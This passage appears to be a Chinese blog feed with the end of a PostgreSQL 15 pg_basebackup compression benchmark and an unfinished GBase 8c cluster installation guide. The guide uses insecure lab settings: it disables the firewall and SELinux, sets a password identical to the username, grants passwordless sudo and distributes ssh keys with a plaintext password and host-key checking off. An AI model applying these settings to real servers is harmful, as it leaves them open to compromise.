<p>该测试主要是针对 PG 15 中 pg_basebackup 的新参数进行功能性测试验证，所以数据量较小。</p>
<ul>
<li>
<p>数据源：<br>
<a class="link"   href="https://www.gov.uk/government/statistical-data-sets/price-paid-data-downloads" >https://www.gov.uk/government/statistical-data-sets/price-paid-data-downloads <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</li>
<li>
<p>创建表：</p>
</li>
</ul>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- Create table:</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> land_registry_price_paid_uk(</span><br><span class="line">  transaction uuid,</span><br><span class="line">  price <span class="type">numeric</span>,</span><br><span class="line">  transfer_date <span class="type">date</span>,</span><br><span class="line">  postcode text,</span><br><span class="line">  property_type <span class="type">char</span>(<span class="number">1</span>),</span><br><span class="line">  newly_built <span class="type">boolean</span>,</span><br><span class="line">  duration <span class="type">char</span>(<span class="number">1</span>),</span><br><span class="line">  paon text,</span><br><span class="line">  saon text,</span><br><span class="line">  street text,</span><br><span class="line">  locality text,</span><br><span class="line">  city text,</span><br><span class="line">  district text,</span><br><span class="line">  county text,</span><br><span class="line">  ppd_category_type <span class="type">char</span>(<span class="number">1</span>),</span><br><span class="line">  record_status <span class="type">char</span>(<span class="number">1</span>));</span><br></pre></td></tr></table></figure></div>
<ul>
<li>导入测试数据：</li>
</ul>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- Copy CSV data, with appropriate munging:</span></span><br><span class="line"><span class="keyword">COPY</span> land_registry_price_paid_uk <span class="keyword">FROM</span> <span class="string">&#x27;/tmp/pp-2022.csv&#x27;</span> <span class="keyword">with</span> (format csv, encoding <span class="string">&#x27;win1252&#x27;</span>, header <span class="literal">false</span>, <span class="keyword">null</span> <span class="string">&#x27;&#x27;</span>, quote <span class="string">&#x27;&quot;&#x27;</span>, force_null (postcode, saon, paon, street, locality, city, district));</span><br></pre></td></tr></table></figure></div>
<ul>
<li>导入结果：</li>
</ul>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">(postgres@[<span class="keyword">local</span>]) [postgres] <span class="number">22</span>:<span class="number">48</span>:<span class="number">25</span># <span class="keyword">COPY</span> land_registry_price_paid_uk <span class="keyword">FROM</span> <span class="string">&#x27;/tmp/pp-2022.csv&#x27;</span> <span class="keyword">with</span> (format csv, encoding <span class="string">&#x27;win1252&#x27;</span>, header <span class="literal">false</span>, <span class="keyword">null</span> <span class="string">&#x27;&#x27;</span>, quote <span class="string">&#x27;&quot;&#x27;</span>, force_null (postcode, saon, paon, street, locality, city, district));</span><br><span class="line"><span class="keyword">COPY</span> <span class="number">766786</span></span><br><span class="line"><span class="type">Time</span>: <span class="number">4067.681</span> ms (<span class="number">00</span>:<span class="number">04.068</span>)</span><br></pre></td></tr></table></figure></div>
<ul>
<li><code>-Z none</code></li>
</ul>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">time pg_basebackup -D b1 -Xs -Ft -Z none</span></span><br><span class="line">2023-03-15 23:05:18.929 CST [84988] LOG:  checkpoint starting: force wait</span><br><span class="line">2023-03-15 23:05:19.046 CST [84988] LOG:  checkpoint complete: wrote 4 buffers (0.0%); 0 WAL file(s) added, 1 removed, 0 recycled; write=0.106 s, sync=0.005 s, total=0.117 s; sync files=3, longest=0.002 s, average=0.002 s; distance=405 kB, estimate=405 kB</span><br><span class="line"></span><br><span class="line">real	0m1.120s</span><br><span class="line">user	0m0.037s</span><br><span class="line">sys	0m0.531s</span><br></pre></td></tr></table></figure></div>
<ul>
<li><code>-Z server-gzip</code></li>
</ul>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">time pg_basebackup -D b2 -Xs -Ft -Z server-gzip</span></span><br><span class="line">2023-03-15 23:06:08.393 CST [84988] LOG:  checkpoint starting: force wait</span><br><span class="line">2023-03-15 23:06:08.399 CST [84988] LOG:  checkpoint complete: wrote 0 buffers (0.0%); 0 WAL file(s) added, 0 removed, 2 recycled; write=0.001 s, sync=0.001 s, total=0.006 s; sync files=0, longest=0.000 s, average=0.000 s; distance=32768 kB, estimate=32768 kB</span><br><span class="line"></span><br><span class="line">real	0m6.221s</span><br><span class="line">user	0m0.023s</span><br><span class="line">sys	0m0.249s</span><br></pre></td></tr></table></figure></div>
<ul>
<li><code>-Z server-lz4</code></li>
</ul>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">time pg_basebackup -D b3 -Xs -Ft -Z server-lz4</span></span><br><span class="line">2023-03-15 23:08:07.705 CST [84988] LOG:  checkpoint starting: force wait</span><br><span class="line">2023-03-15 23:08:07.711 CST [84988] LOG:  checkpoint complete: wrote 0 buffers (0.0%); 0 WAL file(s) added, 0 removed, 2 recycled; write=0.001 s, sync=0.001 s, total=0.006 s; sync files=0, longest=0.000 s, average=0.000 s; distance=32768 kB, estimate=32768 kB</span><br><span class="line"></span><br><span class="line">real	0m0.850s</span><br><span class="line">user	0m0.019s</span><br><span class="line">sys	0m0.178s</span><br></pre></td></tr></table></figure></div>
<ul>
<li><code>-Z server-zstd</code></li>
</ul>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">time pg_basebackup -D b4 -Xs -Ft -Z server-zstd</span></span><br><span class="line">2023-03-15 23:08:59.603 CST [84988] LOG:  checkpoint starting: force wait</span><br><span class="line">2023-03-15 23:08:59.608 CST [84988] LOG:  checkpoint complete: wrote 0 buffers (0.0%); 0 WAL file(s) added, 0 removed, 2 recycled; write=0.001 s, sync=0.001 s, total=0.006 s; sync files=0, longest=0.000 s, average=0.000 s; distance=32768 kB, estimate=32768 kB</span><br><span class="line"></span><br><span class="line">real	0m1.202s</span><br><span class="line">user	0m0.016s</span><br><span class="line">sys	0m0.148s</span><br></pre></td></tr></table></figure></div>
<ul>
<li><code>-Z server-zstd:2</code></li>
</ul>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">time pg_basebackup -D b5 -Xs -Ft -Z server-zstd:2</span></span><br><span class="line">2023-03-15 23:09:36.944 CST [84988] LOG:  checkpoint starting: force wait</span><br><span class="line">2023-03-15 23:09:36.949 CST [84988] LOG:  checkpoint complete: wrote 0 buffers (0.0%); 0 WAL file(s) added, 0 removed, 2 recycled; write=0.001 s, sync=0.001 s, total=0.006 s; sync files=0, longest=0.000 s, average=0.000 s; distance=32768 kB, estimate=32768 kB</span><br><span class="line"></span><br><span class="line">real	0m0.958s</span><br><span class="line">user	0m0.015s</span><br><span class="line">sys	0m0.139s</span><br></pre></td></tr></table></figure></div>
<img  alt="p2.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230315-ca332cde-3842-4888-bd1a-289a6619d4f4.png"
                      referrerpolicy="no-referrer"
                >
<p>汇总测试结果，整理如下表：</p>
<table>
<thead>
<tr>
<th style="text-align:center">compress</th>
<th style="text-align:center">cost time</th>
<th style="text-align:center">backup size</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>-Z none</code></td>
<td style="text-align:center">1.120s</td>
<td style="text-align:center">145M</td>
</tr>
<tr>
<td style="text-align:center"><code>-Z server-gzip</code></td>
<td style="text-align:center">6.221s</td>
<td style="text-align:center">51M</td>
</tr>
<tr>
<td style="text-align:center"><code>-Z server-lz4</code></td>
<td style="text-align:center">0.850s</td>
<td style="text-align:center">65M</td>
</tr>
<tr>
<td style="text-align:center"><code>-Z server-zstd</code></td>
<td style="text-align:center">1.202s</td>
<td style="text-align:center">47M</td>
</tr>
<tr>
<td style="text-align:center"><code>-Z server-zstd:2</code></td>
<td style="text-align:center">0.958s</td>
<td style="text-align:center">49M</td>
</tr>
</tbody>
</table>
<p>可以看出不同的压缩参数会影响备份的大小和备份时间。使用不同的压缩算法和压缩级别需要在时间和空间之间做出权衡。</p>
<h2 id="总结">总结</h2>
<p>pg_basebackup 主要用于热备份，以及快速创建可用备库，压缩算法的支持大大减轻了磁盘空间的需求，网络传输压力，以及磁盘IO负载。</p>
<p>此外，TOAST 压缩方式 (default_toast_compression) 已支持 LZ4 压缩算法，WAL 日志压缩方法 (wal_compression) 已支持 LZ4/zstd 压缩算法。</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">(postgres@[<span class="keyword">local</span>]) [postgres] <span class="number">23</span>:<span class="number">00</span>:<span class="number">32</span># \dconfig <span class="operator">*</span>compression</span><br><span class="line">  List <span class="keyword">of</span> configuration parameters</span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------------+-------+</span></span><br><span class="line"><span class="operator">|</span>         <span class="keyword">Parameter</span>         <span class="operator">|</span> <span class="keyword">Value</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------------+-------+</span></span><br><span class="line"><span class="operator">|</span> default_toast_compression <span class="operator">|</span> lz4   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> wal_compression           <span class="operator">|</span> zstd  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------------+-------+</span></span><br><span class="line">(<span class="number">2</span> <span class="keyword">rows</span>)</span><br></pre></td></tr></table></figure></div>
<hr>
<p><a class="link"   href="https://www.modb.pro/db/618917" >https://www.modb.pro/db/618917 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
<a class="link"   href="https://pgfans.cn/a/2504" >https://pgfans.cn/a/2504 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>PostgreSQL</category>
        <category>PostgreSQL 15</category>
      </categories>
      <tags>
        <tag>postgresql</tag>
        <tag>postgresql 15</tag>
        <tag>pg_basebackup</tag>
        <tag>pg 新特性</tag>
      </tags>
  </entry>
  <entry>
    <title>快速搭建 GBase 8c 集群环境</title>
    <url>/2023/gbase/gbase-8c-install/</url>
    <content><![CDATA[<img  alt="bannerxt.jpg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20240223-5cbd03e9-2986-413d-bdf7-42c4ca510016.jpg"
                      referrerpolicy="no-referrer"
                >
<h2 id="BG">BG</h2>
<p>墨天轮百科已收录【<a class="link"   href="https://www.modb.pro/wiki/5834" >GBase 8c <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>】词条。</p>
<p>GBase 8c 是基于 openGauss 3.0.0 构建的一款多模多态的分布式数据库，支持行存、列存、内存等多种存储模式和单机、主备与分布式等多种部署形态。GBase 8c具备高性能、高可用、弹性伸缩、高安全性等特性，支持强一致性的分布式事务，支持主流的RC和RR的事务隔离级别。可以部署在物理机、虚拟机、容器、私有云和公有云，为关键行业核心系统、互联网业务系统和政企业务系统提供安全、稳定、可靠的数据存储和管理服务。</p>
<p><img  
                     lazyload
                     src="/img/loading.svg"
                     data-src="/2023/gbase/gbase-8c-install/2023-03-14-01.png"
                      alt="" loading="lazy"
                ></p>
<blockquote>
<p>好消息！好消息！ GBase 8c GDCA 认证培训开讲了~<br>
<a class="link"   href="https://www.modb.pro/db/618667" >https://www.modb.pro/db/618667 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
GBase 8c多模多态分布式数据库首期认证培训开班啦，欢迎报名~</p>
</blockquote>
<h2 id="搭建系统环境">搭建系统环境</h2>
<p>南大通用的老师已经贴心的准备好了 GBase 8c 安装包，甚至打包好了镜像，直接导入 VirturlBox 即可。<br>
可参考：<a class="link"   href="https://blog.csdn.net/wiserhowe/article/details/128833346" >CA01.GBase 8c GDCA 认证培训课前准备 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
但为更加深入地了解这款产品，还是自行安装一遍比较好。</p>
<p>首先准备操作系统，我这里已经在 VMware 上装好了一个虚拟机。<br>
操作系统：CentOS 7.9，cpu: 2core, 内存: 4G, swap: 8G, 磁盘：40G，固定IP地址。</p>
<p><img  
                     lazyload
                     src="/img/loading.svg"
                     data-src="/2023/gbase/gbase-8c-install/2023-03-14-02.png"
                      alt="" loading="lazy"
                ></p>
<p>由于个人PC资源有限，这里降低了配置，建议大家还是按照南大通用的推荐配置进行准备。<br>
“配置：内存最低 4G，推荐8G；SWAP配置8G以上，硬盘 50G以上，固定IP地址。”</p>
<h3 id="确认依赖包已经安装">确认依赖包已经安装</h3>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install -y libaio-devel flex bison ncurses-devel glibc-devel patch readline-devel bzip2 firewalld crontabs net-tools openssh-server openssh-clients which sshpass</span><br></pre></td></tr></table></figure></div>
<h3 id="确认系统关闭防火墙">确认系统关闭防火墙</h3>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@centos7 ~]# systemctl status firewalld</span><br><span class="line">● firewalld.service - firewalld - dynamic firewall daemon</span><br><span class="line">   Loaded: loaded (/usr/lib/systemd/system/firewalld.service; disabled; vendor preset: enabled)</span><br><span class="line">   Active: inactive (dead)</span><br><span class="line">     Docs: man:firewalld(1)</span><br><span class="line">[root@centos7 ~]# </span><br></pre></td></tr></table></figure></div>
<h3 id="确认系统关闭selinux">确认系统关闭selinux</h3>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@centos7 ~]# sestatus</span><br><span class="line">SELinux status:                 disabled</span><br><span class="line">[root@centos7 ~]# </span><br></pre></td></tr></table></figure></div>
<h3 id="安装-ntp-组件或-chronyd-组件，确保集群各个节点之间的时间同步">安装 ntp 组件或 chronyd 组件，确保集群各个节点之间的时间同步</h3>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@centos7 ~]# systemctl status ntpd</span><br><span class="line">● ntpd.service - Network Time Service</span><br><span class="line">   Loaded: loaded (/usr/lib/systemd/system/ntpd.service; enabled; vendor preset: disabled)</span><br><span class="line">   Active: active (running) since Tue 2023-03-14 21:23:13 CST; 9min ago</span><br><span class="line">  Process: 700 ExecStart=/usr/sbin/ntpd -u ntp:ntp $OPTIONS (code=exited, status=0/SUCCESS)</span><br><span class="line"> Main PID: 742 (ntpd)</span><br><span class="line">    Tasks: 1</span><br><span class="line">   CGroup: /system.slice/ntpd.service</span><br><span class="line">           └─742 /usr/sbin/ntpd -u ntp:ntp -g</span><br><span class="line"></span><br><span class="line">Mar 14 21:23:15 centos7.shawnyan.com ntpd_intres[750]: DNS 1.centos.pool.ntp.org -&gt; 144.76.76.107</span><br><span class="line">Mar 14 21:23:15 centos7.shawnyan.com ntpd_intres[750]: DNS 2.centos.pool.ntp.org -&gt; 119.28.183.184</span><br><span class="line">Mar 14 21:23:15 centos7.shawnyan.com ntpd_intres[750]: DNS 3.centos.pool.ntp.org -&gt; 84.16.73.33</span><br><span class="line">Mar 14 21:23:17 centos7.shawnyan.com ntpd[742]: Listen normally on 4 ens33 192.168.8.121 UDP 123</span><br><span class="line">Mar 14 21:23:17 centos7.shawnyan.com ntpd[742]: Listen normally on 5 virbr0 192.168.122.1 UDP 123</span><br><span class="line">Mar 14 21:23:17 centos7.shawnyan.com ntpd[742]: Listen normally on 6 ens33 fe80::1bd7:ddf5:c217:cb5e UDP 123</span><br><span class="line">Mar 14 21:23:17 centos7.shawnyan.com ntpd[742]: new interface(s) found: waking up resolver</span><br><span class="line">Mar 14 21:23:24 centos7.shawnyan.com ntpd[742]: 0.0.0.0 c61c 0c clock_step +0.935486 s</span><br><span class="line">Mar 14 21:23:25 centos7.shawnyan.com ntpd[742]: 0.0.0.0 c614 04 freq_mode</span><br><span class="line">Mar 14 21:23:26 centos7.shawnyan.com ntpd[742]: 0.0.0.0 c618 08 no_sys_peer</span><br><span class="line">[root@centos7 ~]# systemctl status chronyd</span><br><span class="line">● chronyd.service - NTP client/server</span><br><span class="line">   Loaded: loaded (/usr/lib/systemd/system/chronyd.service; disabled; vendor preset: enabled)</span><br><span class="line">   Active: inactive (dead)</span><br><span class="line">     Docs: man:chronyd(8)</span><br><span class="line">           man:chrony.conf(5)</span><br></pre></td></tr></table></figure></div>
<h3 id="增加-SWAP-至-8G">增加 SWAP 至 8G</h3>
<p>可按如下步骤操作，或参考<a class="link"   href="https://blog.csdn.net/wiserhowe/article/details/126725440" >CA02.GBase 8c V5 分布式集群版安装示例 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">① 创建 8G 的 Swap 文件</span><br><span class="line"># dd if=/dev/zero of=/etc/swapfile bs=1024 count=8192000</span><br><span class="line">② 制作为 Swap 文件</span><br><span class="line"># mkswap /etc/swapfile</span><br><span class="line">③ 令 Swap 文件生效</span><br><span class="line"># swapon /etc/swapfile</span><br><span class="line">④ 查看当前SWAP</span><br><span class="line"># swapon -s</span><br><span class="line">⑤ 自动挂载。编辑/etc/fstab，将以下行追加到文件末尾</span><br><span class="line">cat &gt;&gt; /etc/fstab &lt;&lt; EOF</span><br><span class="line">/etc/swapfile swap swap defaults 0 0</span><br><span class="line">EOF</span><br><span class="line">⑥ 查看创建好的 SWAP，已经增长了 8G</span><br><span class="line"># free -h</span><br></pre></td></tr></table></figure></div>
<p>此外，如需关闭 SWAP，可参考：<a class="link"   href="https://docs.opengauss.org/zh/docs/3.1.1/docs/installation/%E5%87%86%E5%A4%87%E8%BD%AF%E7%A1%AC%E4%BB%B6%E5%AE%89%E8%A3%85%E7%8E%AF%E5%A2%83.html" >关闭 SWAP 交换内存 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。</p>
<blockquote>
<p>关闭swap交换内存是为了保障数据库的访问性能，避免把数据库的缓冲区内存淘汰到磁盘上。 如果服务器内存比较小，内存过载时，可打开swap交换内存保障正常运行。</p>
</blockquote>
<p>在各数据库节点上，使用 <code>swapoff -a</code> 命令将交换内存关闭。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">swapoff -a</span><br></pre></td></tr></table></figure></div>
<h3 id="克隆虚拟机">克隆虚拟机</h3>
<p>由于集群环境至少需要三个节点，所以可以将当前虚拟机打快照，然后再克隆两份。</p>
<p><img  
                     lazyload
                     src="/img/loading.svg"
                     data-src="/2023/gbase/gbase-8c-install/2023-03-14-03.png"
                      alt="" loading="lazy"
                ></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat &gt; /etc/sysconfig/network-scripts/ifcfg-ens33 &lt;&lt; EOF</span><br><span class="line">DEVICE=ens33</span><br><span class="line">IPADDR=192.168.8.31</span><br><span class="line">NETMASK=255.255.255.0</span><br><span class="line">ONBOOT=yes</span><br><span class="line">TYPE=Ethernet</span><br><span class="line">BOOTPROTO=none</span><br><span class="line">NAME=ens33</span><br><span class="line">GATEWAY=192.168.8.2</span><br><span class="line">DNS1=192.168.8.2</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line">ip a</span><br></pre></td></tr></table></figure></div>
<h3 id="修改-hostname">修改 hostname</h3>
<p>注意修改三个节点的 IP 地址，这里我使用如下三个 IP，并分别修改 hostname。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">node 1: hostnamectl set-hostname gbase8c_1.shawnyan.com</span><br><span class="line">node 2: hostnamectl set-hostname gbase8c_2.shawnyan.com</span><br><span class="line">node 3: hostnamectl set-hostname gbase8c_3.shawnyan.com</span><br></pre></td></tr></table></figure></div>
<table>
<thead>
<tr>
<th style="text-align:center">IP</th>
<th style="text-align:center">hostname</th>
<th style="text-align:center">角色</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">192.168.8.31</td>
<td style="text-align:center">gbase8c_1</td>
<td style="text-align:center">gha_server（高可用服务）、dcs（分布式配置存储）、gtm（全局事务管理）、coordinator（协调器）</td>
</tr>
<tr>
<td style="text-align:center">192.168.8.32</td>
<td style="text-align:center">gbase8c_2</td>
<td style="text-align:center">datanode（数据节点） 1</td>
</tr>
<tr>
<td style="text-align:center">192.168.8.33</td>
<td style="text-align:center">gbase8c_3</td>
<td style="text-align:center">datanode（数据节点） 2</td>
</tr>
</tbody>
</table>
<p>到此，系统环境已准备就绪。</p>
<p><img  
                     lazyload
                     src="/img/loading.svg"
                     data-src="/2023/gbase/gbase-8c-install/2023-03-14-04.png"
                      alt="" loading="lazy"
                ></p>
<h2 id="安装集群软件">安装集群软件</h2>
<h3 id="1-各节点上创建-DBA-gbase-用户">1. 各节点上创建 DBA(gbase) 用户</h3>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">useradd gbase</span><br><span class="line">echo gbase | passwd --stdin gbase</span><br></pre></td></tr></table></figure></div>
<h3 id="2-为-gbase-用户添加-sudo-权限">2. 为 gbase 用户添加 sudo 权限</h3>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sed -i.bak &#x27;/^root/a\gbase ALL=(ALL) NOPASSWD:ALL&#x27; /etc/sudoers</span><br><span class="line">grep &#x27;gbase&#x27; /etc/sudoers -B1</span><br></pre></td></tr></table></figure></div>
<h3 id="3-配置-gbase-用户-ssh-互信">3. 配置 gbase 用户 ssh 互信</h3>
<p>注意：每个节点都要执行以下命令<br>
(1) 切换到 gbase 用户下</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"># su - gbase</span><br></pre></td></tr></table></figure></div>
<p>(2) 创建秘钥目录和必要的授权</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ mkdir ~/.ssh</span><br><span class="line">$ chmod 700 ~/.ssh</span><br></pre></td></tr></table></figure></div>
<p>(3) 生成秘钥文件</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ ssh-keygen -t rsa -N &#x27;&#x27; -f /home/gbase/.ssh/id_rsa -q</span><br></pre></td></tr></table></figure></div>
<p>(4) 将公钥文件上传至其他节点即可实现免密登录（所有节点都要执行）：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ for i in &#123;31..33&#125;; do sshpass -p &#x27;gbase&#x27; ssh-copy-id -o stricthostkeychecking=no gbase@192.168.8.$i; done</span><br></pre></td></tr></table></figure></div>
<h3 id="4-创建安装路径">4. 创建安装路径</h3>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir gbase_package</span><br><span class="line">cd gbase_package/</span><br></pre></td></tr></table></figure></div>
<h3 id="5-上传安装包">5. 上传安装包</h3>
<p>使用 SSH 工具上传安装包 <code>GBase8cV5_S3.0.0B76_centos7.8_x86_64.tar.gz</code> 到主安装节点（192.168.8.31） <code>/home/gbase/gbase_package</code> 路径下</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ ll -h GBase8cV5_S3.0.0B76_centos7.8_x86_64.tar.gz</span><br><span class="line">-rw-r--r-- 1 root root 257M Mar 14 23:23 GBase8cV5_S3.0.0B76_centos7.8_x86_64.tar.gz</span><br></pre></td></tr></table></figure></div>
<h3 id="6-解压安装包">6. 解压安装包</h3>
<p>解压安装包 <code>GBase8cV5_S3.0.0B76_centos7.8_x86_64.tar.gz</code>：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[gbase@gbase8c_1 gbase_package]$ tar zxvf GBase8cV5_S3.0.0B76_centos7.8_x86_64.tar.gz</span><br><span class="line">GBase8cV5_S3.0.0B76_CentOS_x86_64_om.sha256</span><br><span class="line">GBase8cV5_S3.0.0B76_CentOS_x86_64_om.tar.gz</span><br><span class="line">GBase8cV5_S3.0.0B76_CentOS_x86_64_pgpool.tar.gz</span><br><span class="line">GBase8cV5_S3.0.0B76_CentOS_x86_64.sha256</span><br><span class="line">GBase8cV5_S3.0.0B76_CentOS_x86_64.tar.bz2</span><br><span class="line">[gbase@gbase8c_1 gbase_package]$ ll -h</span><br><span class="line">total 514M</span><br><span class="line">-rw-r--r-- 1 root  root   257M Mar 14 23:23 GBase8cV5_S3.0.0B76_centos7.8_x86_64.tar.gz</span><br><span class="line">-rw-rw-r-- 1 gbase gbase    65 Feb 27 16:48 GBase8cV5_S3.0.0B76_CentOS_x86_64_om.sha256</span><br><span class="line">-rw-rw-r-- 1 gbase gbase   99M Feb 27 16:48 GBase8cV5_S3.0.0B76_CentOS_x86_64_om.tar.gz</span><br><span class="line">-rw-rw-r-- 1 gbase gbase 1012K Feb 27 16:48 GBase8cV5_S3.0.0B76_CentOS_x86_64_pgpool.tar.gz</span><br><span class="line">-rw-rw-r-- 1 gbase gbase    65 Feb 27 16:48 GBase8cV5_S3.0.0B76_CentOS_x86_64.sha256</span><br><span class="line">-rw-rw-r-- 1 gbase gbase  158M Feb 27 16:48 GBase8cV5_S3.0.0B76_CentOS_x86_64.tar.bz2</span><br><span class="line">[gbase@gbase8c_1 gbase_package]$ </span><br></pre></td></tr></table></figure></div>
<h3 id="7-再次解压">7. 再次解压</h3>
<p>解压安装包 <code>GBase8cV5_S3.0.0B76_CentOS_x86_64_om.tar.gz</code>：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[gbase@gbase8c_1 gbase_package]$ tar zxf GBase8cV5_S3.0.0B76_CentOS_x86_64_om.tar.gz</span><br><span class="line">[gbase@gbase8c_1 gbase_package]$ ll -rt</span><br><span class="line">total 526104</span><br><span class="line">drwxr-xr-x  4 gbase gbase        28 Mar 16  2021 python3.8</span><br><span class="line">drwx------  6 gbase gbase        87 Jul  2  2022 venv</span><br><span class="line">-rw-rw-r--  1 gbase gbase 165255046 Feb 27 16:48 GBase8cV5_S3.0.0B76_CentOS_x86_64.tar.bz2</span><br><span class="line">-rw-rw-r--  1 gbase gbase        65 Feb 27 16:48 GBase8cV5_S3.0.0B76_CentOS_x86_64.sha256</span><br><span class="line">drwxrwxr-x  2 gbase gbase       330 Feb 27 16:48 simpleInstall</span><br><span class="line">-rw-rw-r--  1 gbase gbase   1035780 Feb 27 16:48 GBase8cV5_S3.0.0B76_CentOS_x86_64_pgpool.tar.gz</span><br><span class="line">drwxrwxr-x  2 gbase gbase        96 Feb 27 16:48 lib</span><br><span class="line">drwxrwxr-x  5 gbase gbase       165 Feb 27 16:48 dependency</span><br><span class="line">-rw-rw-r--  1 gbase gbase        36 Feb 27 16:48 version.cfg</span><br><span class="line">-rw-rw-r--  1 gbase gbase       118 Feb 27 16:48 ubuntu_version.json</span><br><span class="line">drwxrwxr-x 10 gbase gbase      4096 Feb 27 16:48 script</span><br><span class="line">-rw-rw-r--  1 gbase gbase       729 Feb 27 16:48 package_info.json</span><br><span class="line">-rw-rw-r--  1 gbase gbase       188 Feb 27 16:48 gha_ctl.ini</span><br><span class="line">drwxrwxr-x 11 gbase gbase      4096 Feb 27 16:48 gha</span><br><span class="line">-rw-rw-r--  1 gbase gbase      2570 Feb 27 16:48 gbase.yml</span><br><span class="line">-rw-rw-r--  1 gbase gbase 103802128 Feb 27 16:48 GBase8cV5_S3.0.0B76_CentOS_x86_64_om.tar.gz</span><br><span class="line">-rw-rw-r--  1 gbase gbase        65 Feb 27 16:48 GBase8cV5_S3.0.0B76_CentOS_x86_64_om.sha256</span><br><span class="line">-rw-r--r--  1 root  root  268594324 Mar 14 23:23 GBase8cV5_S3.0.0B76_centos7.8_x86_64.tar.gz</span><br><span class="line">[gbase@gbase8c_1 gbase_package]$ </span><br></pre></td></tr></table></figure></div>
<h3 id="8-开始安装">8. 开始安装</h3>
<h4 id="1-编辑集群部署文件-gbase8c-yml">(1) 编辑集群部署文件 gbase8c.yml</h4>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[gbase@gbase8c_1 gbase_package]$ mv gbase.yml gbase.yml.bak</span><br><span class="line">[gbase@gbase8c_1 gbase_package]$ vi gbase.yml</span><br></pre></td></tr></table></figure></div>
<ul>
<li>gbase.yml 修改如下</li>
</ul>
